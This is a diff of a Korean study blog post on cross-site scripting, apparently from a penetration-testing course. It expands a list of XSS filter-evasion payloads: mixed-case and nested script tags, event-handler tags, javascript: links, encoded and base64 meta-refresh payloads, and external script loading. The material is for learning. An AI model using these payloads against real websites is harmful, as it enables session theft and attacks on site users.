@@ -5,7 +5,7 @@ sitemap:
     changefreq: daily
 
 title: "[WEB HACKING] XSS란?"
-excerpt: "모의해킹 취업반 스터디 7기 9주차"
+excerpt: "모의해킹 취업반 스터디 7기 9 ~ 11주차"
 
 date: 2024-12-11
 last_modified_at: 2024-12-26
@@ -112,33 +112,38 @@ e.g.
 1. 기본 구문  
 `<script>alert(1)</script>`
 
-1. `<script>` 태그 필터링  
-`<scr<script>ipt>alert(1);</scr</script>ipt>`  
--> script 태그가 필터링되면 갈라져있던 script 태그가 결합되면서 구문 실행
-
-1. `onmouseover` 이용  
-`<a onmouseover="alert(1)">`  
--> onmouseover 이벤트를 통해 공격 실행  
-
-1. `onerror` 이용  
-`<img src=# onerror="alert(1)">`  
--> 고의적으로 src 주소를 지정 후 onerror 이벤트를 통해 공격 실행  
-
-1. `onload` 이용  
-`<body onload=alert(1)>`  
-
+1. `script` 태그 공백으로 필터링  
+    1. `<ScRiPt>alert(1)</ScRiPt>`  
+    -> 대소문자를 섞는다  
+    1. `<scr<script>ipt>alert(1)</scr</script>ipt>`  
+    -> script 태그가 필터링되면 갈라져있던 script 태그가 결합되면서 구문 실행  
+1. script 태그 다른 문자로 바뀌는 필터링  
+Event Handler 이용: onload, onclick, onmouseover, onfocus 등  
+    1. `onmouseover` 이용  
+    `<a onmouseover="alert(1)">`  
+    -> onmouseover 이벤트를 통해 공격 실행  
+    1. `onerror` 이용  
+    `<img src=# onerror="alert(1)">`  
+    -> 고의적으로 src 주소를 지정 후 onerror 이벤트를 통해 공격 실행  
+    1. `onload` 이용  
+    `<body onload=alert(1)>`  
+    1. `a` tag 이용  
+    `<a href="javascript:alert(1)">test</a>`  
+    1. `input` tag 이용  
+    `<input type="text" autofocus onfocus="alert(1)">`  
 1. XSS Using Script Via Encoded URI Schemes  
 `<IMG SRC=j&#X41vascript:alert(1)>`  
 -> 필터링을 피하기 위해서 인코딩된 글자를 사용한다.  
-
 1. XSS Using Code Encoding  
 `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg">`  
 -> `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg` = `alert(1)`을 base64로 인코딩했다  
 -> META 태그 안에 base64로 인코딩한 스크립트를 집어넣어 `alert()`의 원형을 완전히 숨길 수 있다.  
-
 1. 흔히 사용하지 않는 태그 이용  
 `<ruby onmouseover="alert(1)"></ruby>`  
 -> 해당 태그가 필터에서 누락된 경우 공격 실행  
+
+1. 글자 수 제한일 때
+`<script src = "외부 js"></script>`로 외부 script를 챙겨올 수 있다
 
 ## 5. 공격 순서
 ### 5.1. Reflected XSS
@@ -181,6 +186,8 @@ burp, param check, response에 같은 값 있나?
 * [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 * [DOM-based XSS 1](https://portswigger.net/web-security/cross-site-scripting/dom-based)
 * [DOM-based XSS 2](https://owasp.org/www-community/attacks/DOM_Based_XSS)
+* [해시뱅(#!)에 대해서...](https://blog.outsider.ne.kr/698)
+* [DOM XSS in jQuery anchor href attribute sink using location.search source](https://medium.com/@marduk.i.am/dom-xss-in-jquery-anchor-href-attribute-sink-using-location-search-source-b1000b4b16b3)
 * [XSS(크로스 사이트 스크립트)란? 공격 유형부터 보안대책까지!](https://www.skshieldus.com/blog-security/security-trend-idx-06)
 * [[알아두면 유용한] 넷상의 쓰레기통들 - pastebin과 requestbin](https://domdom.tistory.com/38)
 * [Requestbin Development](https://glasses96.github.io/posts/24/)
